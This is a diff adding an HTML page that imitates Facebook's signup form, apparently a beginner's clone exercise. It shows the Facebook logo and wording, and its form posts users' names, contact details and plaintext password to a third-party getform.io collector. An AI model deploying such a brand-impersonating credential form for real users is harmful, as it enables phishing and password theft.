@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head> 
+        <meta charset="UTF-8"> 
+        <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
+        <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+        <title>Document</title>
+        <link href="css/style.css" rel="stylesheet">
+    </head>
+    <body>
+       <section id="grid_container">
+            <header> 
+               <img src="images/fb_logo.svg">
+            </header>
+
+            <main>
+                <form method="POST" action="https://getform.io/f/e99925cc-0678-4c55-8311-c5530e450183">
+                    <div>
+                        <h1>Create a new account</h1>
+                        <h5> Its quick and easy </h5>
+                    </div>
+
+                    <div class="text_input">
+                        <label for="first_name_id">
+                        <input required
+                        minlength="6"
+                        maxlength="20"
+                        placeholder="First name"
+                        type="text" 
+                        id="full_name_id" 
+                        name="full_name">
+        
+                        <label for="last_name">
+                        <input required
+                        minlength="10"
+                        maxlength="16"
+                        placeholder="Last name"
+                        type="text" 
+                        id="last_name" 
+                        name="last_name">
+                    </div>
+                    <div class="text_input">
+                        <input type="email" name="email_address" required
+                        minlength="12"
+                        maxlength="30"
+                        placeholder="Mobile number or email"
+                        type="text" 
+                        id="email_id" 
+                        name="email_address">
+                    </div>
+
+                    <div class="text_input">
+                        <label for="new_password">
+                            <input required
+                            minlength="8"
+                            maxlength="25"
+                            placeholder="New password"
+                            type="text" 
+                            id="new_password" 
+                            name="password">
+                    </div>
+
+                    <div id="birthday">
+                    <p>Birthday ? </p>
+                    </div>
+
+                    <div id="birthday_container">
+                        <select id="birthday_id" name="birthday">
+                            <option value="month">Month</option>
+                            <option value="jan">Jan</option>
+                            <option value="feb">Feb</option>
+                            <option value="march">Mar</option>
+                            <option value="april">Apr</option>
+                            <option value="may">May</option>
+                            <option value="june">Jun</option>
+                            <option value="july">Jul</option>
+                            <option value="aug">Aug</option>
+                            <option value="sep">Sep</option>
+                            <option value="oct">Oct</option>
+                            <option value="nov">Nov</option>
+                            <option value="dec">Dec</option>
+                        </select>
+                        <select id="birthday_id" name="birthday">
+                            <option value="day">Day</option>
+                            <option value="1">1</option>
+                            <option value="2">2</option>
+                            <option value="3">3</option>
+                            <option value="4">4</option>
+                            <option value="5">5</option>
+                            <option value="6">6</option>
+                            <option value="7">7</option>
+                            <option value="8">8</option>
+                            <option value="9">9</option>
+                            <option value="10">10</option>
+                            <option value="11">11</option>
+                            <option value="12">12</option>
+                            <option value="13">13</option>
+                            <option value="14">14</option>
+                            <option value="15">15</option>
+                            <option value="16">16</option>
+                            <option value="17">17</option>
+                            <option value="18">18</option>
+                            <option value="19">19</option>
+                            <option value="20">20</option>
+                            <option value="21">21</option>
+                            <option value="22">22</option>
+                            <option value="23">23</option>
+                            <option value="24">24</option>
+                            <option value="25">25</option>
+                            <option value="26">26</option>
+                            <option value="27">27</option>
+                            <option value="28">28</option>
+                            <option value="29">29</option>
+                            <option value="30">30</option>
+                            <option value="31">31</option>
+                        </select>
+                        <select id="birthday_id" name="birthday">
+                            <option value="year">Year</option>
+                            <option value="2023">2023</option>
+                            <option value="2022">2022</option>
+                            <option value="2021">2021</option>
+                        </select>
+                    </div>
+
+                    <div id="gender">
+                        <p>Gender ?</p>
+                    </div>
+                    <div class="form_class">
+                       <div class="gender">
+                        <input type="radio" id="female" name="gender" value="Female">
+                        <label for="female">Female</label>
+                       </div>
+                       <div class="gender">
+                        <input type="radio" id="male" name="gender" value="male">
+                        <label for="male">Male</label>
+                       </div>
+                       <div class="gender">
+                        <input type="radio" id="other" name="gender" value="other">
+                        <label for="other">Other</label>
+                       </div>
+                    </div>
+
+                    <div>
+                        <p>
+                            People who use our service may have uploaded your contact information to Facebook. Learn more.
+                        </p>
+                    </div>
+
+                    <div>
+                        By clicking Sign Up, you agree to our Terms, Privacy Policy and Cookies Policy. You may receive SMS Notifications from us and can opt out any time.
+                    </div>
+                    
+
+                
+                    <input type="submit" value="Sign Up">
+                
+                </form>
+            </main>
+       </section>
+    </body>
+</html>
